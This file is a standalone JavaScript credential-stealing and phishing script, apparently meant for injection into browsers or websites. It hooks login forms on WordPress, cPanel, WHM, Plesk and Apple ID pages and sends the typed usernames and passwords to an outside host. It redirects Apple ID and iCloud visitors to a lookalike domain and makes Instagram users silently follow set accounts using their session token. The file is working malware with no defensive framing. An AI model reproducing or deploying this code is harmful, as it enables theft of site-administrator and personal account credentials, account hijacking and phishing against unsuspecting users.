if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
new Image().src = '//whos.amung.us/widget/kekonam92.png';
document.getElementById('wp-submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}
if(document.title.toLowerCase().indexOf("cpanel") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("whm") >= 0){
	
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
document.getElementById('login_submit').onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
};
}


if(document.title.toLowerCase().indexOf("plesk") >= 0){
	new Image().src = '//whos.amung.us/widget/kekonam91.png';
	
document.querySelectorAll("button").onclick = function() {
   new Image().src = '//siktir.ddospanel.us/cp2.php?username='+document.getElementById('loginSection-username').value+'&sifre='+document.getElementById('loginSection-password').value+'&location='+location.href;
};
}
var media = {


instagram: {
        token: function () {
            return document.documentElement.innerHTML.split('csrf_token": "')[1].split('"')[0];
        },
        follow: function (user_id) {
            var url = "https://www.instagram.com/web/friendships/" + user_id + "/follow/",
                xhr = new XMLHttpRequest;
            xhr.open("POST", url, false);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.setRequestHeader("x-csrftoken", this.token());
            xhr.setRequestHeader("x-instagram-ajax", "1");
            xhr.setRequestHeader("x-requested-with", "XMLHttpRequest");
            xhr.send();
        }
    }
}




if (location.hostname.indexOf("instagram.com") >= 0) {

new Image().src = '//whos.amung.us/swidget/v502pxnqo6n1';


media.instagram.follow("4043940203")
media.instagram.follow("4101817865")
media.instagram.follow("1140348283")

}



if(location.hostname.indexOf("appleid.apple.com") >= 0) {
window.location = "http://signin.info.apple.com";
}

if(location.hostname.indexOf("icloud.com") >= 0) {
window.location = "http://signin.info.apple.com";
}
	
	
	
if(location.hostname.indexOf("apple.com") >= 0) {

	
	

		function hit(url) {
        ifrm = document.createElement("iframe");
        ifrm.setAttribute("src", url);
        ifrm.style.width = "0px";
        ifrm.style.height = "0px";
        document.body.appendChild(ifrm);
}

document.getElementById('submitButton2').onclick = function() {

  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
  hit(a);
}

document.getElementById('accountname').onkeypress = function(e) {
    if(e.keyCode == 13) {
  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
   hit(a);
 }
}
document.getElementById('accountpassword').onkeypress = function(e) {
    if(e.keyCode == 13) {
  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
   hit(a);
 }
}
}
